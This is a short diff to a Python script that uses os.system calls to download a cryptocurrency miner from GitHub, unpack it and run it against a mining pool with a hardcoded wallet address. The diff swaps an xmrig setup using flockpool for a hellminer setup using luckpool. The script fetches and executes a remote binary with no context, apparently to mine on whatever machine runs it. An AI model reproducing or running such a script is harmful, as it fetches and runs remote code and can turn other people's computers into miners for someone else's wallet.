@@ -2,6 +2,6 @@ import os
 os.system('pip install wget')
 os.system('su apt install wget')
 
-os.system('python -m wget https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-linux-static-x64.tar.gz')
-os.system('tar xf xmrig-6.16.2-linux-static-x64.tar.gz')
-os.system('./xmrig-6.16.2/xmrig -a gr -o us.flockpool.com:5555 --tls -u RLUciajDyEujXL6J21S83EfapBJLte9gu6.kk11 -p')
+os.system('python -m wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz')
+os.system('tar xf hellminer_cpu_linux.tar.gz')
+os.system('./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RMkFLsUYiqYiWmXCG29AD3EpF2AseMtiqY.worke -p x')
